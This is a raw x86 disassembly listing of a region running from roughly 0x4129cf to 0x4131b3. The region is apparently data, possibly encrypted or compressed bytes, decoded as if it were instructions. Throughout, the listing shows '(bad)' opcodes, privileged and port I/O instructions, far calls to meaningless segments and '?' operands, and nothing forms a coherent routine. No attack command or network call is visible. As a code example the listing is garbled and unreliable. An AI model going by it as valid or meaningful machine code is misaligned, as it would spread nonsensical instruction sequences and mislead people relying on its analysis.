  4129cf:	idiv   BYTE PTR [ecx]
  4129d1:	aas    
  4129d2:	xchg   ebp,eax
  4129d3:	cdq    
  4129d4:	adc    bh,al
  4129d6:	jecxz  0x4129d9
  4129d8:	jno    0x4129c8
  4129da:	jae    0x412a5a
  4129dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129dd:	test   eax,0x1f7ee567
  4129e2:	fistp  QWORD PTR [ebp+0x33012742]
  4129e8:	arpl   WORD PTR [esi-0x29],si
  4129eb:	leave  
  4129ec:	cli    
  4129ed:	and    edi,0x619fb0fb
  4129f3:	sub    edx,DWORD PTR [edx]
  4129f5:	test   DWORD PTR ds:0x5719e2b0,ecx
  4129fb:	xchg   ebx,eax
  4129fc:	jbe    0x4129c6
  4129fe:	fld    DWORD PTR [edi+eiz*4+0x5e]
  412a02:	xchg   ebp,eax
  412a03:	in     al,0xa2
  412a05:	scas   eax,DWORD PTR es:[edi]
  412a06:	xchg   edi,eax
  412a07:	jne    0x4129b1
  412a09:	js     0x412a49
  412a0b:	inc    esi
  412a0c:	mov    ecx,ebp
  412a0e:	ret    0x71a2
  412a11:	xchg   edi,eax
  412a12:	pop    ebp
  412a13:	mov    eax,ds:0x2b4a7278
  412a18:	push   es
  412a19:	and    BYTE PTR [edi],ah
  412a1b:	pop    esi
  412a1c:	sub    al,0xc3
  412a1e:	mov    edi,0xd57bee1f
  412a23:	lock mov edi,0x9fcf48c4
  412a29:	test   DWORD PTR [esi+esi*2-0x74],edi
  412a2d:	sub    eax,0xb22a50f6
  412a32:	int3   
  412a33:	pop    ecx
  412a34:	inc    edi
  412a35:	lods   al,BYTE PTR ds:[esi]
  412a36:	aad    0xd4
  412a38:	push   ebp
  412a39:	shr    BYTE PTR [ebp-0x32593c92],cl
  412a3f:	jne    0x4129dd
  412a41:	popf   
  412a42:	fcom   QWORD PTR [ebp+0x1ca33bb4]
  412a48:	loope  0x412ab5
  412a4a:	aad    0x5
  412a4c:	mov    dl,0x33
  412a4e:	ror    DWORD PTR ds:0x84796b2c,0xb8
  412a55:	mov    ds:0x5431e90b,eax
  412a5a:	jmp    FWORD PTR [ebx-0x1c2a40c2]
  412a60:	jae    0x412ab1
  412a62:	mov    eax,0xa19bd343
  412a67:	jne    0x412a6b
  412a69:	and    BYTE PTR [esi+ecx*4+0x35],0x54
  412a6e:	sbb    dl,cl
  412a70:	jecxz  0x4129f6
  412a72:	stc    
  412a73:	push   ebp
  412a74:	mov    ds:0xa8f8d5e5,al
  412a79:	stos   DWORD PTR es:[edi],eax
  412a7a:	punpckhdq mm2,QWORD PTR [edi+0x23]
  412a7e:	cld    
  412a7f:	ret    0x2410
  412a82:	rcl    BYTE PTR [edx+edx*2-0x5b],cl
  412a86:	mov    edi,0xdcfa6751
  412a8b:	mov    ds:0xc2d25a5,eax
  412a90:	sbb    eax,0x200d404d
  412a96:	push   ebp
  412a97:	fcomp  DWORD PTR [ebp+0x4c]
  412a9a:	loope  0x412b02
  412a9c:	loop   0x412a57
  412a9e:	aad    0x8f
  412aa0:	idiv   BYTE PTR [edx+0x26b355f7]
  412aa6:	cmp    DWORD PTR [ebp+0x75],esi
  412aa9:	pop    esi
  412aaa:	fs push es
  412aac:	or     bh,BYTE PTR [esp+ecx*4+0x502b970d]
  412ab3:	jae    0x412b26
  412ab5:	retf   0x3446
  412ab8:	(bad)
  412abb:	mov    eax,ds:0x784ff71b
  412ac0:	xchg   ecx,eax
  412ac1:	xchg   ebp,eax
  412ac2:	data16 das 
  412ac4:	popa   
  412ac5:	cmp    BYTE PTR [ebx+0x710171a8],dh
  412acb:	add    DWORD PTR [ecx],edi
  412acd:	mov    al,ds:0x1fc37dbd
  412ad2:	add    dl,bh
  412ad4:	push   0xa53beb22
  412ad9:	lods   eax,DWORD PTR ds:[esi]
  412ada:	and    eax,0xd5ab5fae
  412adf:	jmp    0xbae4d63
  412ae4:	rcl    BYTE PTR [ecx],0x85
  412ae7:	mov    ch,al
  412ae9:	popa   
  412aea:	loopne 0x412b60
  412aec:	push   ebp
  412aed:	aam    0xde
  412aef:	aam    0x40
  412af1:	xchg   ebp,edx
  412af3:	out    dx,eax
  412af4:	xor    ebx,ecx
  412af6:	es scas eax,DWORD PTR es:[edi]
  412af8:	jne    0x412ad1
  412afa:	out    0x74,al
  412afc:	and    al,0x76
  412afe:	add    DWORD PTR [edi-0x5005532b],0x71
  412b05:	lds    esp,FWORD PTR [edx-0x3b78a577]
  412b0b:	nop
  412b0c:	push   esi
  412b0d:	and    BYTE PTR [eax+0x62],cl
  412b10:	add    eax,0x7e29426d
  412b15:	rcl    esi,0xee
  412b18:	loope  0x412add
  412b1a:	xchg   edi,eax
  412b1b:	mov    WORD PTR [edx+0x61a5cac4],es
  412b21:	mov    al,ds:0xa34f8b27
  412b26:	es pusha 
  412b28:	jno    0x412b87
  412b2a:	and    DWORD PTR [ecx+ebp*4+0x38],ecx
  412b2e:	xchg   ecx,eax
  412b2f:	jne    0x412b7d
  412b31:	std    
  412b32:	mov    dh,0x73
  412b34:	lea    ebx,[edi-0x678bf9a2]
  412b3a:	dec    ebp
  412b3b:	test   BYTE PTR ds:0x7756123,al
  412b41:	(bad)  
  412b42:	pusha  
  412b43:	inc    esi
  412b44:	cmp    al,0x69
  412b46:	(bad)  
  412b47:	cmp    eax,0xef49cb97
  412b4c:	scas   eax,DWORD PTR es:[edi]
  412b4d:	lahf   
  412b4e:	mov    ds:0x1491ade2,al
  412b53:	jecxz  0x412b53
  412b55:	pop    ds
  412b56:	xchg   esi,eax
  412b57:	inc    ebp
  412b58:	push   ebx
  412b59:	inc    esi
  412b5a:	enter  0xbeee,0xf9
  412b5e:	(bad)  
  412b5f:	sti    
  412b60:	xor    DWORD PTR [esi],ebp
  412b62:	movntq QWORD PTR [ebp-0x6d3e32be],mm6
  412b69:	and    bh,bh
  412b6b:	cmp    dl,BYTE PTR [edx-0x62]
  412b6e:	xchg   esp,eax
  412b6f:	sti    
  412b70:	call   0xd546:0xa844ea0c
  412b77:	jne    0x412b33
  412b79:	dec    esi
  412b7a:	arpl   WORD PTR [edi],si
  412b7c:	stos   BYTE PTR es:[edi],al
  412b7d:	enter  0x7572,0xc8
  412b81:	or     BYTE PTR [eax-0x648f3a30],al
  412b87:	push   es
  412b88:	scas   al,BYTE PTR es:[edi]
  412b89:	mov    eax,DWORD PTR ds:0x98557875
  412b8f:	nop
  412b90:	dec    ebx
  412b91:	(bad)  
  412b92:	fnstenv [ebp+ebp*2-0x71]
  412b96:	inc    esi
  412b97:	test   al,0x14
  412b99:	adc    ebx,ebx
  412b9b:	ja     0x412b2a
  412b9d:	js     0x412b41
  412b9f:	pop    eax
  412ba0:	push   eax
  412ba1:	adc    BYTE PTR [ebp-0x7c],0x19
  412ba5:	xchg   DWORD PTR [ebx+esi*2+0x7a],ebx
  412ba9:	or     eax,0xb798756b
  412bae:	sub    DWORD PTR ds:0x37f49b11,esp
  412bb4:	jno    0x412bd1
  412bb6:	jo     0x412bbd
  412bb8:	mov    BYTE PTR [ebp-0x72],cl
  412bbb:	loopne 0x412ba2
  412bbd:	pop    ecx
  412bbe:	js     0x412bff
  412bc0:	jno    0x412bea
  412bc2:	mov    eax,0x1c585b6b
  412bc7:	cmp    dh,BYTE PTR [eax+ecx*4+0x29]
  412bcb:	cli    
  412bcc:	inc    ebx
  412bcd:	aam    0x80
  412bcf:	sub    eax,0x7563c1b4
  412bd4:	repz cmp bl,BYTE PTR [ebx+0x77]
  412bd8:	sbb    BYTE PTR [ebp-0x638340f5],bh
  412bde:	dec    edi
  412bdf:	les    esp,FWORD PTR cs:[esi-0x306e7cf6]
  412be6:	out    0x31,eax
  412be8:	fisub  WORD PTR [esi]
  412bea:	cmp    ah,al
  412bec:	dec    edi
  412bed:	inc    edi
  412bee:	or     dh,ch
  412bf0:	pop    es
  412bf1:	dec    ecx
  412bf2:	adc    edx,DWORD PTR [edx+0x78]
  412bf5:	xchg   edx,eax
  412bf6:	xchg   ebp,eax
  412bf7:	mov    ah,0x42
  412bf9:	dec    ebx
  412bfa:	add    eax,0x981b747
  412bff:	js     0x412c02
  412c01:	add    edi,0x39
  412c04:	jne    0x412c09
  412c06:	mov    dh,0xfd
  412c08:	icebp  
  412c09:	push   ebp
  412c0a:	jecxz  0x412bb2
  412c0c:	mov    ecx,0x60352dbd
  412c11:	cs xchg edx,eax
  412c13:	sbb    al,0x8a
  412c15:	and    DWORD PTR [ecx+eiz*2+0x36a5a421],edx
  412c1c:	shl    DWORD PTR [ebp+0x7878dd3c],1
  412c22:	repnz or DWORD PTR [edi],esp
  412c25:	mov    ebp,0x75a1deb5
  412c2a:	out    dx,al
  412c2b:	or     DWORD PTR [ebx+0x1e],0x43
  412c2f:	adc    BYTE PTR [ecx],0xea
  412c32:	mov    eax,0xd5aed359
  412c37:	repz adc dh,ch
  412c3a:	inc    esp
  412c3b:	ret    0xe4b4
  412c3e:	push   ebp
  412c3f:	jne    0x412c55
  412c41:	sahf   
  412c42:	dec    eax
  412c43:	loopne 0x412c01
  412c45:	mov    ch,0x89
  412c47:	jno    0x412cbf
  412c49:	or     dh,0xec
  412c4c:	and    edi,DWORD PTR [eax+0x61875755]
  412c52:	add    al,0x75
  412c54:	xlat   BYTE PTR ds:[ebx]
  412c55:	(bad)
  412c59:	ret    
  412c5a:	mov    ch,0xa3
  412c5c:	je     0x412c0f
  412c5e:	arpl   WORD PTR [edx],dx
  412c60:	inc    edi
  412c61:	int    0x2
  412c63:	lods   eax,DWORD PTR ds:[esi]
  412c64:	xchg   edi,eax
  412c65:	(bad)  
  412c66:	aad    0xc7
  412c68:	(bad)  
  412c69:	and    al,0x9e
  412c6b:	mov    esi,DWORD PTR [esi+0x786cf4e3]
  412c71:	or     DWORD PTR [esi],edx
  412c73:	fcmovu st,st(5)
  412c75:	xchg   esp,eax
  412c76:	int3   
  412c77:	adc    eax,0x74fa0c6d
  412c7c:	mov    ebx,0x474372c0
  412c81:	outs   dx,BYTE PTR ds:[esi]
  412c82:	push   edx
  412c83:	je     0x412cf6
  412c85:	mov    ecx,0x9e1f6213
  412c8a:	jns    0x412cda
  412c8c:	int3   
  412c8d:	xchg   ecx,eax
  412c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c8f:	jne    0x412d05
  412c91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c92:	fisubr WORD PTR [edi+0x45b780a]
  412c98:	loope  0x412c7e
  412c9a:	aad    0xdf
  412c9c:	jnp    0x412ce3
  412c9e:	pop    ds
  412c9f:	cmp    DWORD PTR [esi],edx
  412ca1:	popf   
  412ca2:	sbb    eax,0x4d30e675
  412ca7:	xchg   edi,eax
  412ca8:	cmp    ebx,DWORD PTR [edi]
  412caa:	jbe    0x412cdb
  412cac:	jmp    0x58b8:0x78edd607
  412cb3:	pand   mm3,QWORD PTR [edi-0x1a578ae0]
  412cba:	mov    BYTE PTR [edx+0x17d511aa],ah
  412cc0:	jmp    0x57be0244
  412cc5:	aaa    
  412cc6:	call   FWORD PTR [ebx-0x35]
  412cc9:	lahf   
  412cca:	retf   
  412ccb:	test   cl,ah
  412ccd:	jbe    0x412c80
  412ccf:	push   ebx
  412cd0:	xchg   ecx,eax
  412cd1:	xchg   esi,eax
  412cd2:	xchg   ecx,eax
  412cd3:	out    0xfa,eax
  412cd5:	xor    dl,ch
  412cd7:	xchg   esi,eax
  412cd8:	out    dx,eax
  412cd9:	popa   
  412cda:	lods   eax,DWORD PTR ds:[esi]
  412cdb:	popf   
  412cdc:	outs   dx,BYTE PTR ds:[esi]
  412cdd:	lahf   
  412cde:	mov    WORD PTR [ebp-0x25],?
  412ce1:	or     ebp,DWORD PTR [esi]
  412ce3:	and    edi,DWORD PTR [edi]
  412ce5:	stc    
  412ce6:	jns    0x412d4c
  412ce8:	jno    0x412c89
  412cea:	iret   
  412ceb:	rcr    DWORD PTR [edi+0x6f],1
  412cee:	mov    DWORD PTR [eax-0x78],ebp
  412cf1:	pop    ds
  412cf2:	mov    ds:0xb7568eaa,al
  412cf7:	test   al,0x9c
  412cf9:	aas    
  412cfa:	aad    0x73
  412cfc:	xchg   DWORD PTR [ecx+0x7d99f911],esp
  412d02:	xor    ah,0x0
  412d05:	and    BYTE PTR [ecx+0x2a],al
  412d08:	lahf   
  412d09:	call   0x39d5:0xa7db811a
  412d10:	inc    ebp
  412d11:	mov    ebp,0x23f16577
  412d16:	jns    0x412d8d
  412d18:	cwde   
  412d19:	lods   eax,DWORD PTR ds:[esi]
  412d1a:	push   edx
  412d1b:	lock xchg ebx,eax
  412d1d:	adc    eax,0x2272b0a0
  412d22:	jmp    0x499b:0x4e0f2b35
  412d29:	dec    esi
  412d2a:	repz je 0x412d13
  412d2d:	ss adc eax,0x8a70617d
  412d33:	mov    edx,0x5fd6885b
  412d38:	push   ds
  412d39:	push   0x7b
  412d3b:	jno    0x412d0c
  412d3d:	or     al,0xb6
  412d3f:	push   eax
  412d40:	xor    al,0x20
  412d42:	xor    dh,BYTE PTR [ecx+0x5f228dbf]
  412d48:	les    ebx,FWORD PTR [esi-0x258eaaba]
  412d4e:	mov    ecx,0x91c8ac23
  412d53:	mov    edi,0x4e851f85
  412d58:	fsubr  DWORD PTR [ebp+0x276d3e6c]
  412d5e:	aad    0x31
  412d60:	inc    edi
  412d61:	xor    DWORD PTR [ebx+ebx*8],edx
  412d64:	scas   al,BYTE PTR es:[edi]
  412d65:	int3   
  412d66:	aaa    
  412d67:	xchg   edx,eax
  412d68:	mov    ds:0x2e630741,al
  412d6d:	pop    edx
  412d6e:	aad    0xfc
  412d70:	or     al,0x17
  412d72:	dec    ebx
  412d73:	add    BYTE PTR [ebp-0x2e4d2a9d],ah
  412d79:	jmp    0x412df5
  412d7b:	push   esp
  412d7c:	push   esi
  412d7d:	adc    DWORD PTR [esi],ecx
  412d7f:	jp     0x412d8c
  412d81:	in     eax,dx
  412d82:	add    bh,0xf1
  412d85:	lahf   
  412d86:	mov    esp,0xd5cb7ccf
  412d8b:	repz (bad) [eax+0x37]
  412d8f:	mov    eax,ds:0x68ff4863
  412d94:	sbb    esp,DWORD PTR [eax]
  412d96:	cmc    
  412d97:	mov    ecx,0xfceee9c7
  412d9c:	ins    BYTE PTR es:[edi],dx
  412d9d:	mov    cl,0x52
  412d9f:	jnp    0x412e20
  412da1:	sub    al,0x15
  412da3:	jns    0x412dfb
  412da5:	mov    al,ds:0x574aa492
  412daa:	mov    edi,0x554c0ab3
  412daf:	mov    esi,0xf136cdc3
  412db4:	sbb    DWORD PTR [ebp-0xae52313],ebx
  412dba:	xchg   edi,eax
  412dbb:	cmp    BYTE PTR [edi+0x20],bl
  412dbe:	sbb    ecx,ebp
  412dc0:	mov    eax,DWORD PTR ds:0x34c7f07c
  412dc6:	rcl    DWORD PTR [edx+0x48f72771],0x11
  412dcd:	inc    edi
  412dce:	and    eax,0x58204986
  412dd3:	ja     0x412d79
  412dd5:	shl    BYTE PTR [eax],0x80
  412dd8:	fst    DWORD PTR [ebp+0x5b7167b5]
  412dde:	and    cl,BYTE PTR [edx-0x68]
  412de1:	clc    
  412de2:	and    esi,esp
  412de4:	call   0x76b2:0xfc237d1f
  412deb:	xor    cl,dl
  412ded:	test   eax,0x65dc7ada
  412df2:	mov    al,0xaf
  412df4:	xor    ebp,edx
  412df6:	ja     0x412e77
  412df8:	mov    ch,0x1f
  412dfa:	retf   
  412dfb:	and    BYTE PTR [edx-0x2fe4f9f9],cl
  412e01:	or     edi,0x8
  412e04:	jno    0x412dd9
  412e06:	xor    ebx,esi
  412e08:	pop    eax
  412e09:	pop    edi
  412e0a:	xor    BYTE PTR [edx-0x32],al
  412e0d:	pop    ds
  412e0e:	popf   
  412e0f:	lods   al,BYTE PTR ds:[esi]
  412e10:	pop    esp
  412e11:	push   ebx
  412e12:	cmp    BYTE PTR [ebx-0x312a2fcd],bh
  412e18:	les    esp,FWORD PTR ds:0xaaf979a3
  412e1e:	jnp    0x412e95
  412e20:	inc    ebx
  412e21:	(bad)  
  412e22:	repz mov ah,BYTE PTR [edx-0x64]
  412e26:	out    0x58,al
  412e28:	jno    0x412e19
  412e2a:	dec    esi
  412e2b:	adc    cl,BYTE PTR [ebx-0x475b4596]
  412e31:	pop    ds
  412e32:	mov    ds:0xf5324d20,eax
  412e37:	xor    al,0xc
  412e39:	cmp    edx,ebp
  412e3b:	mov    WORD PTR [ebp-0x3604b197],?
  412e41:	dec    eax
  412e42:	cmp    esi,DWORD PTR [ebp-0x2d]
  412e45:	into   
  412e46:	and    ecx,edx
  412e48:	fisubr WORD PTR [ebx+0x2b71c218]
  412e4e:	sti    
  412e4f:	dec    esi
  412e50:	lds    esi,FWORD PTR [eax]
  412e52:	ret    
  412e53:	cmp    DWORD PTR [eax+0x2d],edi
  412e56:	out    0x5c,eax
  412e58:	fbld   TBYTE PTR [ecx+0x5e556275]
  412e5e:	push   ebx
  412e5f:	sbb    eax,0x50a6c07f
  412e64:	in     eax,0x88
  412e66:	push   esp
  412e67:	cmc    
  412e68:	push   edx
  412e69:	sbb    DWORD PTR [ebx-0x60],ebx
  412e6c:	loopne 0x412e8d
  412e6e:	xor    ebp,DWORD PTR [edx+0xbeb6784]
  412e74:	(bad)  
  412e75:	cmp    eax,0x905951d5
  412e7a:	add    al,0x24
  412e7c:	sar    BYTE PTR [ecx+0x23677682],cl
  412e82:	sbb    al,0xe6
  412e84:	jbe    0x412e34
  412e86:	das    
  412e87:	aad    0x7b
  412e89:	aas    
  412e8a:	aad    0x53
  412e8c:	test   DWORD PTR [ecx],ebp
  412e8e:	push   esi
  412e8f:	mov    edx,0x75535051
  412e94:	rcr    DWORD PTR [edx+0x2e],0xf0
  412e98:	test   BYTE PTR [ebx],dl
  412e9a:	mov    bh,BYTE PTR [ecx+0x71]
  412e9d:	or     al,0x5
  412e9f:	punpckldq mm1,DWORD PTR [ecx-0x74]
  412ea3:	inc    esp
  412ea4:	or     DWORD PTR [esi-0x36],ecx
  412ea7:	mov    dl,BYTE PTR [eax-0x5df3e3e1]
  412ead:	xchg   ebx,eax
  412eae:	aas    
  412eaf:	sub    dh,BYTE PTR [ecx-0x66]
  412eb2:	pop    ds
  412eb3:	jl     0x412e7c
  412eb5:	mov    edx,0x203c612d
  412eba:	inc    esp
  412ebb:	or     eax,0x93ccd980
  412ec0:	push   esp
  412ec1:	(bad)  
  412ec3:	adc    ebp,ebp
  412ec5:	pop    ebp
  412ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec7:	pop    es
  412ec8:	ins    DWORD PTR es:[edi],dx
  412ec9:	xor    eax,0x90ae74e5
  412ece:	cmp    eax,0x9eecc872
  412ed3:	sub    eax,0xa0fc0580
  412ed8:	pop    eax
  412ed9:	push   cs
  412eda:	imul   edx,ebp,0xffffffac
  412edd:	jo     0x412ed3
  412edf:	mov    al,0x22
  412ee1:	and    BYTE PTR [edi],bl
  412ee3:	and    eax,0x808aba14
  412ee8:	inc    ebx
  412ee9:	scas   al,BYTE PTR es:[edi]
  412eea:	aad    0x6a
  412eec:	cs std 
  412eee:	sbb    al,0x79
  412ef0:	inc    esp
  412ef1:	inc    eax
  412ef2:	and    eax,0x9f1f9e55
  412ef7:	and    DWORD PTR [esi-0x327683a7],edi
  412efd:	stos   BYTE PTR es:[edi],al
  412efe:	aad    0xdf
  412f00:	leave  
  412f01:	mov    al,0x56
  412f03:	call   0xf590:0x84793adf
  412f0a:	je     0x412f61
  412f0c:	pop    eax
  412f0d:	(bad)  
  412f0e:	pop    ds
  412f0f:	sbb    al,0xac
  412f11:	push   es
  412f12:	push   edx
  412f13:	xor    eax,0x2b81adb0
  412f18:	gs das 
  412f1a:	aad    0xe9
  412f1c:	and    esp,DWORD PTR [eax+0x41]
  412f1f:	out    dx,eax
  412f20:	pop    ds
  412f21:	clc    
  412f22:	inc    edi
  412f23:	js     0x412f6d
  412f25:	lock pusha 
  412f27:	mov    bl,0x52
  412f29:	inc    edx
  412f2a:	test   DWORD PTR [esi],edx
  412f2c:	xchg   dh,ch
  412f2e:	ret    
  412f2f:	lods   eax,DWORD PTR ds:[esi]
  412f30:	lea    ecx,[edx]
  412f32:	pop    esp
  412f33:	xchg   ecx,esi
  412f35:	adc    al,0xde
  412f38:	pushf  
  412f39:	enter  0x7830,0xbb
  412f3d:	mov    ds:0x1ef1d95f,eax
  412f42:	jle    0x412f94
  412f44:	xchg   ebp,eax
  412f45:	mov    al,ds:0x39199f24
  412f4a:	aad    0x26
  412f4c:	and    al,0xd1
  412f4e:	imul   ebp,DWORD PTR ds:0xe4ec9246,0x59
  412f55:	das    
  412f56:	(bad)  
  412f57:	mul    BYTE PTR [esi]
  412f59:	lahf   
  412f5a:	push   eax
  412f5b:	mov    esp,0xaefb055d
  412f60:	neg    DWORD PTR [ecx]
  412f62:	push   esi
  412f63:	ins    BYTE PTR es:[edi],dx
  412f64:	inc    eax
  412f65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f66:	ret    
  412f67:	(bad)  
  412f68:	aas    
  412f69:	xor    ebp,DWORD PTR [ebp+0x1]
  412f6c:	jb     0x412fb1
  412f6e:	xchg   edi,eax
  412f6f:	inc    edx
  412f70:	repnz sahf 
  412f72:	jne    0x412fbd
  412f74:	inc    ebp
  412f75:	xchg   DWORD PTR [ecx+0x75],eax
  412f78:	jecxz  0x412f43
  412f7a:	in     eax,dx
  412f7b:	(bad)  
  412f7d:	std    
  412f7e:	xor    BYTE PTR [edx],ah
  412f80:	jno    0x412ff5
  412f82:	shr    DWORD PTR [eax-0x41],cl
  412f85:	xchg   DWORD PTR ds:0xc72017f2,eax
  412f8b:	retf   
  412f8c:	ins    BYTE PTR es:[edi],dx
  412f8d:	repnz iret 
  412f8f:	and    DWORD PTR [ebx-0x7a182a60],edi
  412f95:	pop    DWORD PTR [edx-0x74ebcfaa]
  412f9b:	jne    0x412fb9
  412f9d:	das    
  412f9e:	into   
  412f9f:	adc    DWORD PTR [eax+0x6c],ecx
  412fa2:	adc    esi,DWORD PTR [ebp-0x7c96298f]
  412fa8:	xor    DWORD PTR [eax+0x4c],esi
  412fab:	dec    ebp
  412fac:	xor    al,0x20
  412fae:	(bad)  
  412fb0:	repnz xor ecx,esp
  412fb3:	call   0x52b8:0x24d56d6e
  412fba:	mov    edi,0x6d0e369e
  412fbf:	repz pushf 
  412fc1:	pop    ds
  412fc2:	sbb    bh,BYTE PTR [ebx]
  412fc4:	out    0x25,al
  412fc6:	pop    edi
  412fc7:	retf   0x3a63
  412fca:	sbb    eax,0xa61fd633
  412fcf:	mov    esp,0xfd84e52d
  412fd4:	jl     0x412ff5
  412fd6:	ins    BYTE PTR es:[edi],dx
  412fd7:	push   ebp
  412fd8:	push   ebx
  412fd9:	push   ds
  412fda:	fcmovnb st,st(4)
  412fdc:	push   ds
  412fdd:	(bad)  
  412fdf:	btr    eax,edx
  412fe2:	rcl    BYTE PTR [ecx-0x53],1
  412fe5:	mov    eax,ebp
  412fe7:	push   0xffffff9c
  412fe9:	sub    eax,0x9e94cf81
  412fee:	push   ebp
  412fef:	push   0x93a28ea3
  412ff4:	jno    0x412fcc
  412ff6:	cdq    
  412ff7:	or     edi,DWORD PTR [ebx+0x25]
  412ffa:	sbb    ch,dl
  412ffc:	inc    ebx
  412ffd:	and    BYTE PTR [esi+0x2a6c8508],ah
  413003:	es icebp 
  413005:	mov    ds:0x16b17dd5,al
  41300a:	scas   al,BYTE PTR es:[edi]
  41300b:	mov    ds:0xad9ccf5a,eax
  413010:	retf   
  413011:	jo     0x412fe8
  413013:	mov    esi,0x3a573e13
  413018:	repnz or al,0xd6
  41301b:	xchg   ch,dh
  41301d:	push   0x1e7cb3b0
  413022:	and    al,0xae
  413024:	sub    ah,BYTE PTR [ecx-0x24]
  413027:	push   esi
  413028:	mov    bh,0x3f
  41302a:	std    
  41302b:	xor    al,0xe3
  41302d:	inc    eax
  41302e:	xlat   BYTE PTR ds:[ebx]
  41302f:	inc    ebx
  413030:	jb     0x413075
  413032:	stos   DWORD PTR es:[edi],eax
  413033:	fistp  DWORD PTR [eax+0x9]
  413036:	lahf   
  413037:	mov    edx,0xbbd1766a
  41303c:	ins    BYTE PTR es:[edi],dx
  41303d:	add    BYTE PTR [ebp-0x4961377c],bl
  413043:	jbe    0x413096
  413045:	sar    ecx,1
  413047:	loopne 0x4130a0
  413049:	outs   dx,DWORD PTR ds:[esi]
  41304a:	(bad)  
  41304b:	enter  0xee03,0xf7
  41304f:	nop
  413050:	bound  edi,QWORD PTR [ecx-0x33]
  413053:	retf   0x9336
  413056:	adc    DWORD PTR [ebp-0x6a],esi
  413059:	sar    DWORD PTR [ebp-0x795ce587],cl
  41305f:	pushf  
  413060:	jno    0x413083
  413062:	mov    ds:0x8a4d04e1,al
  413067:	inc    eax
  413068:	imul   edi,DWORD PTR [esi+ecx*1],0x5a1fe182
  41306f:	push   cs
  413070:	mov    ebx,0x717aef43
  413075:	jecxz  0x413033
  413077:	mov    ds:0x1a2d7ddc,al
  41307c:	mov    esp,0xd3a6d324
  413081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413082:	out    0x34,al
  413084:	inc    esp
  413085:	xor    eax,0x26a93ddd
  41308a:	cli    
  41308b:	je     0x4130e7
  41308d:	into   
  41308e:	fist   WORD PTR [edx-0x44]
  413091:	xchg   edx,eax
  413092:	stc    
  413093:	je     0x413052
  413095:	outs   dx,BYTE PTR ds:[esi]
  413096:	push   es
  413097:	(bad)  
  413098:	lods   eax,DWORD PTR ds:[esi]
  413099:	jge    0x41306f
  41309b:	js     0x413111
  41309d:	out    0xe4,al
  41309f:	xchg   edx,eax
  4130a0:	test   dl,dh
  4130a2:	adc    al,0x6d
  4130a4:	sub    DWORD PTR [eax+0x52d68499],edx
  4130aa:	mov    DWORD PTR [ecx+0x60],ebp
  4130ad:	or     edx,DWORD PTR [esi]
  4130af:	or     edi,DWORD PTR [ecx]
  4130b1:	and    al,0xe3
  4130b3:	jae    0x413126
  4130b5:	das    
  4130b6:	xchg   edi,eax
  4130b7:	into   
  4130b8:	stc    
  4130b9:	mov    ds:0x1fc3bd05,al
  4130be:	push   ecx
  4130bf:	stc    
  4130c0:	gs daa 
  4130c2:	jnp    0x413104
  4130c4:	fs hlt 
  4130c6:	aad    0xb
  4130c8:	mov    dl,0x95
  4130ca:	test   al,0xea
  4130cc:	mov    al,0x64
  4130ce:	jne    0x413062
  4130d0:	mov    ?,WORD PTR [edi-0xc]
  4130d3:	xor    al,0x55
  4130d5:	cmc    
  4130d6:	xor    ecx,DWORD PTR [ebx+ecx*8-0x43]
  4130da:	aad    0x36
  4130dc:	popf   
  4130dd:	data16 jecxz 0x413076
  4130e0:	sbb    edi,DWORD PTR [edi-0x64736db5]
  4130e6:	fnstenv [ecx+eiz*4+0x26]
  4130ea:	jns    0x413151
  4130ec:	into   
  4130ed:	shl    dl,1
  4130ef:	test   eax,0xb315c80a
  4130f4:	(bad)
  4130f7:	ret    
  4130f8:	(bad)  
  4130f9:	pop    ds
  4130fa:	push   ebp
  4130fb:	ds adc al,0x7c
  4130fe:	in     al,dx
  4130ff:	and    BYTE PTR [ebp+0x7aa5e3a5],cl
  413105:	xor    al,0x82
  413107:	xor    eax,0x41b2c9df
  41310c:	data16 and BYTE PTR [eax+0x7d],ah
  413110:	imul   edx,DWORD PTR [esi+0x36],0xd8840923
  413117:	sbb    BYTE PTR [edx-0x4e9b1deb],dh
  41311d:	pop    ss
  41311e:	mov    al,0x29
  413120:	mov    BYTE PTR [edi],bl
  413122:	sub    dl,BYTE PTR [edx+0x0]
  413125:	inc    eax
  413126:	call   0x8679:0xd56c899f
  41312d:	push   cs
  41312e:	push   edi
  41312f:	inc    edx
  413130:	xchg   esp,eax
  413131:	inc    ecx
  413132:	je     0x4131ac
  413134:	je     0x41315e
  413136:	into   
  413137:	loop   0x41311a
  413139:	out    dx,eax
  41313a:	jne    0x413110
  41313c:	iret   
  41313d:	fcomp  DWORD PTR gs:[edx]
  413140:	pop    ecx
  413141:	mov    eax,0x1ba5033e
  413146:	xchg   esi,eax
  413147:	push   ebp
  413148:	or     eax,ebx
  41314a:	bound  esi,QWORD PTR [ebp-0x4e]
  41314d:	xor    eax,0xb02f2988
  413152:	rol    BYTE PTR [esi],cl
  413154:	jno    0x413121
  413156:	dec    edx
  413157:	sbb    dl,ah
  413159:	cli    
  41315a:	sbb    eax,ebx
  41315c:	sbb    DWORD PTR [edi+0x46],ebx
  41315f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413160:	jno    0x4131ae
  413162:	sbb    BYTE PTR [ecx-0x6a],bh
  413165:	in     al,0xd7
  413167:	div    DWORD PTR [ecx-0x1a]
  41316a:	sahf   
  41316b:	fnstenv [eax]
  41316d:	xchg   ebp,eax
  41316e:	icebp  
  41316f:	fldcw  WORD PTR [ebp+0x23]
  413172:	push   ebx
  413173:	leave  
  413174:	dec    esp
  413175:	jmp    0x41312e
  413177:	(bad)  
  413179:	dec    ebx
  41317a:	or     bh,BYTE PTR [ebp+0x71]
  41317d:	mov    edx,0xa1ec19b5
  413182:	sysexit 
  413184:	mov    BYTE PTR [eax],ah
  413186:	inc    ebp
  413187:	lahf   
  413188:	clc    
  413189:	lock (bad) 
  41318c:	mov    edi,edi
  41318e:	xor    ebx,DWORD PTR [ebx+0x47950f72]
  413194:	sbb    eax,DWORD PTR [esi-0x44b216c7]
  41319a:	add    eax,0xb1e5a675
  41319f:	cwde   
  4131a0:	and    DWORD PTR [ebx+0x5f7131a2],0xa678e419
  4131aa:	push   edx
  4131ab:	pop    esp
  4131ac:	call   0x715:0xd291491f
  4131b3:	sbb    eax,ebx
